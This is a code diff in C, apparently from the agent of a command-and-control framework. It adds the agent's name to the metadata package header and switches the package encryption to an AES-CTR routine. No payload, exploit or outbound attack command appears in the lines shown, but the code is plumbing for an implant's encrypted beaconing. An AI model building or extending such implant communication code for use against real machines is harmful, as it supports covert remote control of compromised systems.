@@ -53,6 +53,14 @@ pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
+	if ((err = AddInt32ToPackage(pack, StringLengthA(Agent->config->AgentName))) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add agent name length to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
+	if ((err = AddStringToPackage(pack, Agent->config->AgentName)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add string to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
 
 	return pack;
 }
@@ -213,7 +221,8 @@ INT AddPaddingToPackage(pPackage pack, PCHAR data, SIZE_T size) {
 
 	return PACKAGE_SUCCESS;
 }
-
+//TODO REWRITE THIS FUNCTION TO ADD BYTE SIZE AS PREFIX TO BYTES PAYLOAD.
+//THEN EDIT ALL STRING / BYTES ADD PACKAGE FUNCTION CALLS TO REMOVE THE ADD32INT BEFORE
 INT AddBytesToPackage(pPackage pack, PBYTE data, SIZE_T size) {
 
 	if (!pack)
@@ -233,7 +242,7 @@ INT AddBytesToPackage(pPackage pack, PBYTE data, SIZE_T size) {
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_REALLOC_FAILED;
 
-	CopyMemory((PUCHAR)pack->Buffer + pack->Length, data, size); //TODO issues trying to copy memory?
+	CopyMemory((PUCHAR)pack->Buffer + pack->Length, data, size);
 	pack->Length += size; 
 
 	return PACKAGE_SUCCESS;
@@ -319,13 +328,13 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pA
 
 	if (pack->Encrypt)
 	{
-
+		BOOL Encrypt = TRUE;
 		INT err;
 		//TODO perform encryption.
-		if ((err = AESEncrypt(
-			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
-			pack->Length - (PACKAGE_HEADER_LENGTH + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - HEADERS - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
-			Agent->AESKey, AES_256_KEY_SIZE, Agent->IV)																//AES KEY, AES KEY SIZE, IV
+		if ((err = AESCTR(
+			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(Agent->config->AgentName) + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + AgentName Length + AgentName String Length (part of Headers) + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
+			pack->Length - (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(Agent->config->AgentName) + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - (HEADERS + AgentName Length + AgentName String Length (part of Headers)) - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
+			Agent->AESKey, AES_256_KEY_SIZE, Agent->IV, Encrypt)																//AES KEY, AES KEY SIZE, IV
 			) != 0) {
 			return err;
 		}
